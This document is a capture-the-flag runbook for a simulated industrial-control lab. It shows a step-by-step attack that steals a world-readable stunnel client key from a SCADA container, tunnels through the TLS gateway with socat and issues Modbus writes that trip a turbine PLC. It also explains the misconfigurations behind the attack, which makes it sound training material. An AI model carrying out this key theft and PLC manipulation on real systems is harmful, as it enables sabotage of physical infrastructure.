# Runbook: stunnel client key theft and direct PLC access

The SCADA container holds a world-readable private key that grants mTLS access
to the stunnel gateway. Once stolen, the key lets any host on the operational
network bypass the SCADA system entirely and issue Modbus commands directly to
the turbine PLC. The TLS gateway was meant to enforce mutual authentication.
The client operator decided certificate errors were inconvenient, so now
it is mutual authentication in one direction only.

- Techniques: 
  - [Credential attacks and authentication abuse](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#credential-attacks-and-authentication-abuse)
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [IT/OT boundary crossing](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#initial-access-and-lateral-movement-through-the-it-ot-boundary)
  - [Data exfiltration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#data-exfiltration)
  - [Unauthorised state manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#unauthorised-state-manipulation)
- Challenge type: Realist
- Difficulty: Advanced

## Components to start

```bash
./ctl up
sudo ./ctl firewall
```

Minimal containers: `distribution-scada`, `scada-db`, `uupl-modbus-gw`, `hex-turbine-plc`

`scada-db` is the MySQL sidecar required by `distribution-scada`. A Phase 1 entry chain
is also needed to reach the operational zone; see `admin-home-pivot.md` or
`enterprise-to-turbine-trip.md` for the minimum containers that chain requires.

Entry point: a host with access to the operational zone. `bursar-desk`
(10.10.2.100) and the engineering workstation (10.10.2.30) both have direct
routes to the SCADA server and the stunnel gateway.

## Background

The stunnel gateway at `uupl-modbus-gw` (10.10.2.50) bridges the operational
and control zones: it accepts TLS on port 8502 and forwards plain Modbus TCP
to the turbine PLC at 10.10.3.21:502. The gateway enforces `verify = 2`, so
the client certificate is required. The SCADA container at 10.10.2.20 holds
the client certificate and key in `/run/stunnel-certs/`. The key is
world-readable (HEX-5103, "fix in next outage window"). The SCADA stunnel
client has `verify = 0` because the server certificate expired and nobody
renewed it (HEX-4421, "won't fix"). The gateway authenticates the client;
the client does not authenticate the gateway. The stolen key works from
anywhere that can reach port 8502.

## Attack path

### Stage 1: get a shell on the SCADA server

```bash
# distribution-scada at 10.10.2.20, Scada-LTS default credentials
ssh scada_admin@10.10.2.20
# Password: W1nd0ws@2016 (from the ops-access.conf chain or SCADA /config endpoint)
# Alternatively, reach the Scada-LTS web interface directly:
# http://10.10.2.20:8080  admin / admin
```

### Stage 2: collect the client certificate and key

```bash
# World-readable: no sudo, no escalation required
ls -la /run/stunnel-certs/
# client.crt  client.key  ca.crt

cat /run/stunnel-certs/client.key
# -----BEGIN EC PRIVATE KEY-----  (or RSA, depending on build)

# Copy both files to the engineering workstation or directly to unseen-gate
scp /run/stunnel-certs/client.crt engineer@10.10.2.30:/tmp/
scp /run/stunnel-certs/client.key engineer@10.10.2.30:/tmp/
```

### Stage 3: confirm gateway connectivity

```bash
# From the engineering workstation (10.10.2.30 / 10.10.3.100)
# The gateway does not verify its own cert on the client side; verify=0 is fine
openssl s_client -connect 10.10.2.50:8502 \
  -tls1 \
  -cert /tmp/client.crt \
  -key /tmp/client.key \
  -verify_return_error 0
# Should show handshake success and forward to the PLC's banner
```

### Stage 4: open a plain-Modbus local tunnel

```bash
# socat turns the TLS tunnel into a local TCP port that any Modbus tool can use
socat TCP-LISTEN:5020,fork,reuseaddr \
  OPENSSL:10.10.2.50:8502,cert=/tmp/client.crt,key=/tmp/client.key,verify=0
# Local port 5020 now forwards to the PLC via the gateway
```

### Stage 5: interact with the PLC directly

```bash
# Use the local socat port as if it were the PLC
/venv/bin/python3 modbus_read.py 127.0.0.1 5020 input 0 11
# [2987, 312, 87, 231, 229, 148, 147, 500, 68000, 43, 12]

# Emergency stop: the SCADA system has no visibility of this command
/venv/bin/python3 modbus_write.py 127.0.0.1 5020 coil 0 1

# Overspeed trip
/venv/bin/python3 modbus_write.py 127.0.0.1 5020 holding 0 4000
```

## Flag placement

Place the flag in `/run/stunnel-certs/client.key` as a comment line after the
PEM footer, visible only after SSHing to the SCADA container and reading the
file:

```
-----END EC PRIVATE KEY-----
# RM{...}
```

Alternatively, set IR[10] on the PLC when a Modbus write arrives via the
stunnel gateway rather than through the SCADA control path. The participant
connects via the stolen key, writes to a register, and reads back the flag.

## Why world-readable keys happen

HEX-5103 was opened when the key permissions were noticed. It was not fixed
because no user account on the SCADA container has write access to anything
sensitive. The key being world-readable was deemed an acceptable risk on the
assumption that nobody would get a shell on the SCADA server. The assumption
was the problem, not the file permissions.

The TLSv1 pin (HEX-3887) and the expired cert (HEX-4421) each required a
maintenance window to fix and neither was ever prioritised. The result is a TLS
connection that provides the appearance of security while the client ignores the
server's identity and the protocol version has been deprecated since 2021.
